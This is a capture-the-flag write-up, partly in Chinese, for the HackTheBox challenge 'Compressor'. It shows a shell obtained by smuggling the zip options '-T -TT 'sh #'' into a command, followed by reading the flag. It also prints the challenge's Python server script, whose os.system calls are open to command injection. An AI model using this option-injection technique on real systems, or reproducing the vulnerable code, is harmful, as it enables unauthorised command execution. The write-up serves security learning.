# Compressor

:::note CHALLENGE DESCRIPTION

Difficulty: VERY EASY

Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?

拉莫娜对改装和给身体添加人造物的痴迷拖慢了她的速度，导致她在许多任务中失败，甚至险些丧命。出于这个原因，她决定黑掉金牙公司拥有的一款名为“压缩机”的小型机器人。这款机器人可以根据任务需要缩小或放大任何物体的体积，从而实现最小化或最大化。有了这件装备，她就能携带任何所需的备用零件，而不会增加额外的负重，从而提升她的速度。你能帮她夺取并黑掉它吗？

:::

参考 [zip | GTFOBins](https://gtfobins.github.io/gtfobins/zip/)

交互过程：

```shell
┌──(randark ㉿ kali)-[~]
└─$ nc 94.237.54.161 42473

[*] Directory to work in: P0V6S4WIdBFtxJaxC2lvaNx4RY7xttki

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 1

[*] Sub-directory to work in: P0V6S4WIdBFtxJaxC2lvaNx4RY7xttki/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Compress artifact (zip <name>.zip <name> <options>)
4. Change directory  (cd <dirname>)
5. Clean directory   (rm -rf ./*)
6. Exit

[*] Choose action: 1


Insert name: a

Insert content: a


[+] Artifact [a] was created successfuly!

Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Compress artifact (zip <name>.zip <name> <options>)
4. Change directory  (cd <dirname>)
5. Clean directory   (rm -rf ./*)
6. Exit

[*] Choose action: 3


Insert <name>.zip: a
Insert <name>: a
Insert <options>: -T -TT 'sh #'
  adding: a (stored 0%)
whoami
ctf
ls -lh
total 8K
-rw-r--r--    1 ctf      ctf            1 Mar 11 12:04 a
-rw-------    1 ctf      ctf          153 Mar 11 12:04 ziiFGlKP
cd /
ls -lh
total 60K
drwxr-xr-x    1 root     root        4.0K Nov 30  2021 bin
drwxr-xr-x    5 root     root         360 Mar 11 11:33 dev
drwxr-xr-x    1 root     root        4.0K Mar 11 11:33 etc
drwxr-xr-x    1 root     root        4.0K Mar  3  2022 home
drwxr-xr-x    1 root     root        4.0K Nov 30  2021 lib
drwxr-xr-x    5 root     root        4.0K Nov 24  2021 media
drwxr-xr-x    2 root     root        4.0K Nov 24  2021 mnt
drwxr-xr-x    2 root     root        4.0K Nov 24  2021 opt
dr-xr-xr-x  240 root     root           0 Mar 11 11:33 proc
drwx------    1 root     root        4.0K Mar  3  2022 root
drwxr-xr-x    2 root     root        4.0K Nov 24  2021 run
drwxr-xr-x    1 root     root        4.0K Nov 30  2021 sbin
drwxr-xr-x    2 root     root        4.0K Nov 24  2021 srv
dr-xr-xr-x   13 root     root           0 Mar 11 11:33 sys
drwxrwxrwt    1 root     root        4.0K Mar 11 11:33 tmp
drwxr-xr-x    1 root     root        4.0K Mar  3  2022 usr
drwxr-xr-x    1 root     root        4.0K Nov 30  2021 var
cd /home/ctf
ls -lh
total 128K
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:55 0VVzdMgidUTfw3atwgLm1iPJhGb7NQjY
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:54 0uiih807QNeWlz0QtsnsQo9PgmHH2m7m
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:44 5QxEVTGux9LblQYEvqKN0uGdVPn0azKr
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:45 7XgWylDz4SxDg0uIWFmRvkoKafQt95Ze
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:52 7mSxNe00ppbWbdvea6VXr5sPxd6bTFCs
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:45 7ryPDmOAjldjtMXtvma9rTznxbDtQmjo
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:53 8odPwxrsDFrndulPd1UgkcTKBAsdUM74
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 12:04 Bei7bxNYuARKfRhL0CrhBZOlaa1OPkcs
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:54 CmkgIxOvQ5xWlTg0dk1i9Kz24H0lBbF2
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:54 ERk8ADikktz1xdA0ohme1KqbAd6jWYl7
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:43 IaEuwE1RiC9klnhbg2PZ2iaQ2mNbww8r
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:49 N81x5gi6AxLvR83honwQosL5mbJOccD1
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:53 NZRdbjqrflf0DA77ju2mJ9BklKog3iNj
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 12:04 P0V6S4WIdBFtxJaxC2lvaNx4RY7xttki
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:48 TWPLZcdbJ6G9NBeW7YIz5EkgL6TT4gS8
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:58 YdpgPfY3wrpiZMDzSvH5ENp5jE8DKgBz
-rwxrwxr-x    1 root     root        2.9K May 16  2022 artifacts.py
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:50 bvI3cyDBdUZthCdCBMTjI9N9sBl1lnAR
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:58 c7FT5SPM37JlpFXuqF4bfc5idNH1Llj8
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:48 cj3PYp1B32cv9KPdGQ3HeGPecBr0jQaD
-rw-rw-r--    1 root     root         263 May 12  2022 clear.py
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:45 ej1fVX2nZKYTxqCrfUPx0UYhmBwGoePC
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 12:01 fOSudjRqbAdOuDFQwruebUV8omWcMiV9
-rw-rw-r--    1 root     root          41 May 23  2022 flag.txt
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:43 iyj8yHYIBDa8eICEdBw8vCbKnVSbtDwz
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:47 j1CYHDkz5crnxs2GFsEV0OAxcyu03HV4
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:54 kyj3jwfjsr35k54TebLBFkfA831aD80e
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:48 lPWzgC5EtlFQ5SOHUa3kX3zRUPa9u8dc
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:51 ro7CIraxvGeBwDiy30ma8Xo1dBXl6h4y
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:48 sj1up8FC0lVaUwFHhaHjdDvquSFNuDGk
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:43 t85xxSJlE5UXeLA82RreBPlgskBuLtYa
drwxr-sr-x    6 ctf      ctf         4.0K Mar 11 11:45 yZC7b8WmkNDbYhNLe57eBOOBocwtqxCT
cat flag.txt
HTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}
```

得到了题目部署的脚本

```python title="artifacts.py"
#!/usr/bin/python3
import os, random
from termcolor import colored


whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.'#/ "
PATH = "./"
sub_array = ["Head", "Torso", "Hands", "Legs"]

# Create random directory
def rand_dirname(length=32):
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    dirname = ""
    while len(dirname) < length:
        dirname += random.choice(charset)
    return dirname

def check_filename(filename):
    return all(i in whitelist for i in filename)

def change_sub_dir(idx, color):
  print(colored(f"\n[*] Sub-directory to work in: {dirname}/{sub_array[idx]}\n", color))
  os.chdir(PATH + sub_array[idx])

def subjects():
  subs = """\nComponent List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+
  """
  print(colored(subs, "magenta"))
  ans = int(input(colored("[*] Choose component:", "magenta")))

  if ans == 1:
    change_sub_dir(0, "blue")
  elif ans == 2:
    change_sub_dir(1, "green")
  elif ans == 3:
    change_sub_dir(2, "cyan")
  elif ans == 4:
    change_sub_dir(3, "yellow")
  else:
    print(colored("\n[-] Invalid option!\n", "red"))
    exit()

def menu():
  m = """
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Compress artifact (zip <name>.zip <name> <options>)
4. Change directory  (cd <dirname>)
5. Clean directory   (rm -rf ./*)
6. Exit
  """
  print(colored(m, "yellow"))
  return int(input(colored("[*] Choose action:", "yellow")))

def create_file():
  fname = input(colored("Insert name:", "yellow")).strip()
  if not check_filename(fname):
    print(colored("\n[-] Invalid name!\n", "red"))
    exit()
  os.system(f"touch {fname}")
  contents = input(colored("\nInsert content:", "yellow"))
  f = open(fname, "a")
  f.write(contents)
  f.close()
  print("\n")
  print(colored(f"[+] Artifact [{fname}] was created successfuly!", "green"))

def zip():
  zip_name = input(colored("Insert <name>.zip:", "blue")).strip()
  files    = input(colored("Insert <name>:", "blue")).strip()
  options  = input(colored("Insert <options>:", "blue")).strip()
  if not check_filename(zip_name) or not check_filename(files) or not check_filename(options):
    print(colored("\n[-] Invalid name!\n", "red"))
    exit()
  os.system(f"zip {zip_name}.zip {files} {options}")

# Create directory
dirname = rand_dirname()
print(colored(f"\n[*] Directory to work in: {dirname}", "cyan"))
os.mkdir(PATH + dirname)
os.chdir(PATH + dirname)
os.system("mkdir -p Head Torso Hands Legs")

ans = subjects()

while True:

  # Choose action
  act = menu()
  print("\n")
  if act == 1:
    create_file()
  elif act == 3:
    zip()
  elif act == 2:
    os.system("pwd; ls -la")
  elif act == 5:
    os.system("rm -rf ./*")
  elif act == 4:
    os.chdir(f"../../{dirname}")
    ans = subjects()
  else:
    print(colored("\n[-] Invalid option!\n", "red"))
    os.system("rm -rf ./*")
    exit()
```

```python title="clear.py"
import os

os.system('ls -la> temp')

f = open('temp', 'r')
for line in f:
  arr = line.split()
  try:
    if len(arr[8]) > 16:
      os.system(f'rm -rf {arr[8]}')
  except:
    print('')

print(f'[+] Directories have been deleted!\n')
os.system('rm -f ./temp')
```

```plaintext title="Flag"
HTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}
```
